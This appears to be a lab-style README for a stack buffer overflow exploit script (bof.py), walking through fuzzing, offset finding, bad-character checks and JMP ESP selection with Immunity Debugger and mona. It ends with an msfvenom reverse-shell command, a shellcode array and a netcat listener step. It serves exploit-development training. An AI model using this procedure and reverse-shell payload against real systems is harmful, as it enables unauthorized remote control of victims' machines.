# Stack-Buffer-Overflow

![image](https://user-images.githubusercontent.com/41350723/173417707-2753ae6f-1bb2-4858-a1a5-a38d7cdc1fb4.png)


## Before you begin.
* Start the vulnerable app via Immunity Debugger or attach it to Immunity 
* Change IP and Port in bof.py
* Connect using netcat and see if you get a banner or an options menu.
* If you do, uncomment s.receive(1024) on line 52.
* If you have to prefix your buffer value with a command, set prefix value otherwise leave it as empty string.
* If after sending a command if you get any kind of reply, uncomment s.receive(1024) on line 55.

![image](https://user-images.githubusercontent.com/41350723/173417177-d499ac6e-a14c-4108-a075-836d1023b784.png)

##  Option 1 -- Fuzzer
* Execute and make a note of the largest number of bytes that were sent.
* Generate a cyclic pattern of same length as the bytes that crashed the server.
  
  `msf-pattern_create -l <Bytes>`

* Paste the cyclic string into payload variable in bof.py
* Restart the app in Immunity Debugger
    
## Option 2 -- Get Offset
* Restart the app in Immunity Debugger
* Execute Option 2
* In Immunity Debugger, run the following mona command

    `!mona findmsp -distance <bytes>`    ( Change to same length as the pattern )

* In the output you should see a line which states:

    `EIP contains normal pattern : ... (offset XXXX)`

* Update bof.py and set the offset variable to this value

## Option 3 -- Verify Offset
* Restart the app in Immunity Debugger
* Execute Option 3
* The EIP register should now have 4 B's (i.e. 42424242).

## Option 4 -- Generate BadChars
* Generate a bytearray using mona, and exclude the null byte (\x00).

    `!mona bytearray -b "\x00"`

* Note-down the path of the bytearray.bin
* Execute Option 4 to generate a string of bad chars that is identical to the bytearray
* Update bof.py and change the payload variable to this string

## Option 5 -- Check BadChars
* Restart the app in Immunity Debugger
* Execute Option 5
* Make a note of the ESP register address and use it in the following mona command:

    `!mona compare -f C:\Address\To\bytearray.bin -a <address>` <-- modify path and ESP address

* A popup should appear labelled "mona Memory comparison results".
  * The first badchar in the list should be the null byte (\x00).
  * Make a note of any others.
* Generate a new bytearray in mona including these new badchars along with \x00.
    
    `!mona bytearray -b "\x00"   <-- Add the other badchars`

* In bof.py remove the new badchars from paload variable.
* Restart the app in Immunity Debugger
* Run Option 5 again
* Run the mona command agian (Check ESP register address again, it might have changed)

    `!mona compare -f C:\Address\To\bytearray.bin -a <address>`    <-- modify path and ESP address

* Repeat these steps until the results status returns "Unmodified"

## Option 6 -- Exploit
* With the Application either running or in a crashed state, run one of the following mona commands.
Make sure to add all the badchars you identified (including \x00):
  
  * Find JMP ESP - inside the main executable
	  
    `!mona jmp -r esp -cpb "\x00"`    <-- Add the other badchars identified
	    
  * Find JMP ESP - inside one of the DLLs
	  
    `!mona modules`
    * We need to find a .dll were Rebase, SafeSEH, ASLR, NXCompat are set to False. When you find it, run the command below to search for a JMP ESP (FFE4), inside the dll.
	
	  `!mona find -s "\xff\xe4" -m <DLL-NAME> -cpb "\x00"`    <-- Add the other badchars
	  
      or
	
      `!mona find -s 'jmp esp' -type instr -m <DLL-NAME> -cpb "\x00"`    <-- Add the other badchars
      
    * This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window.
  * Choose an address and update bof.py by setting the "EIP" variable to the address, written backwards (ittle endian).
    
    `For example if the address is 01020304 in Immunity, write it as EIP = "\x04\x03\x02\x01" in bof.py.`

* Run the follwing msfvenom command to generate a reverse shell
    
    `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c`       <-- Add the other badchars

* Update bof.py by pasting the generated C code strings into shellcode variable using the following notation:
    ```
    shellcode = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
    "\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
    ...
    "\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
    "\x19\x53\xd0\x92\x19\x53\x2e\x1d")
    ```
      Notice there is no semicolon ; at the end
* Adjust the nopsled variable if needed
* Execute Option 6 after setting up a listner in kali

